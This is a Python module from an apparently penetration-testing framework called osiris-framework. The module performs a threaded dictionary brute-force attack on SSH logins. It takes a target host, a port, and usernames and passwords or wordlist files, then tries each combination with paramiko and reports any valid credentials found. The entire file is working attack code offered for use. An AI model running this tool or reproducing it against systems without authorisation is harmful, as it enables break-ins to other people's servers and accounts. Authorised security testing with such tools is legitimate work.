#!/usr/bin/env python3
# Project: osiris-framework
# Author: Samir Sanchez Garnica @sasaga92
# Version 1.0
# Date: 16/11/2022

from core.ModuleObtainer import obtainer
import paramiko, signal
from utilities.Messages import print_message
print_message.name_module = __file__
import warnings
from utilities.Tools import tools
warnings.filterwarnings(action='ignore',module='.*paramiko.*')
import threading
from time import sleep

info = {
        'author'            :'Samir Sanchez Garnica',
        'date'              :'2019/03/10',
        'rank'              :'Excellent',
        'path'              :'auxiliary/scanner/ssh/ssh_bruteforce.py',
        'category'          :'auxiliary',
        'license'           :'GPL-2.0',
        'description'       :'module that allows you to perform brute force attack type dictionary on the SSH service and authenticate',
        'references'        :['https://es.wikipedia.org/wiki/Ataque_de_fuerza_bruta']
}
options = {
        'rhost'                 :['Yes', 'use to set rhost',''],
        'rport'                  :['Yes', 'use to set rport','22'],
        'username'               :['No', 'use to set username',''],
        'username_file'          :['No', 'use to set username_file',''],
        'password'               :['No', 'use to set password',''],
        'password_file'          :['No', 'use to set password_file',''],
}

required = {
        'start_required'     :'True',
        'check_required'     :'False'
}


def init_worker():
    signal.signal(signal.SIGINT, signal.SIG_IGN)


def ssh_connect(__target, __username, __password, __port):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(__target, __port, __username, __password, timeout=1)
        print_message.execution_credentials_found([__target, __username, __password])
    except paramiko.AuthenticationException:
        print_message.execution_try_credentials([__target, __username, __password])
    except Exception as Error:
        print(Error)
    ssh.close()
    return

def exploit():
    """ main exploit function """

    try:

        __target = obtainer.options['rhost'][2]
        __port = obtainer.options['rport'][2]
        __username = obtainer.options['username'][2]
        __password = obtainer.options['password'][2]
        __username_file = obtainer.options['username_file'][2]
        __password_file = obtainer.options['password_file'][2]
        __threads = []
        if len(__target) > 0 and len(__port) > 0:
            try:
                if not isinstance(int(__port), int):
                    print_message.execution_error("The rport parameter must be defined and be integer")
                    return  False
            except:
                print_message.execution_error("The rport parameter must be defined and be integer")
                return False

            __response = tools.check_IPV4(__target)

            if __response['code'] != 200:
                print_message.execution_error(__response['message'])
                return False

            print_message.start_execution()

            if __username_file == "" and __password_file == "":
                try:
                    for __address in __response['message']:
                        __thread = threading.Thread(target=ssh_connect, args=(__address, __username, __password, __port))
                        __thread.start()
                        __threads.append(__thread)
                        sleep(0.1)

                    for __join_thread in __threads:
                        __join_thread.join()
                except KeyboardInterrupt:
                    for __join_thread in __threads:
                        __join_thread.join()
                except:
                    for __join_thread in __threads:
                        __join_thread.join()
                print_message.end_execution()

            elif __username_file != "" and __password_file == "":
                try:
                    __username_file = tools.read_file(__username_file)
                    for __username in __username_file:
                        __thread = threading.Thread(target=ssh_connect, args=(__target, __username, __password, __port))
                        __thread.start()
                        __threads.append(__thread)
                        sleep(0.1)
                    for __join_thread in __threads:
                        __join_thread.join()
                except KeyboardInterrupt:
                    for __join_thread in __threads:
                        __join_thread.join()
                except:
                    for __join_thread in __threads:
                        __join_thread.join()
            elif __username_file == "" and __password_file != "":
                try:
                    __password_file = tools.read_file(__password_file)
                    for __password in __password_file:
                        __thread = threading.Thread(target=ssh_connect, args=(__target, __username, __password, __port))
                        __thread.start()
                        __threads.append(__thread)
                        sleep(0.1)
                    for __join_thread in __threads:
                        __join_thread.join()
                except KeyboardInterrupt:
                    for __join_thread in __threads:
                        __join_thread.join()
                except:
                    for __join_thread in __threads:
                        __join_thread.join()

                print_message.end_execution()
    except Exception as Error:
        print(Error)
        return False

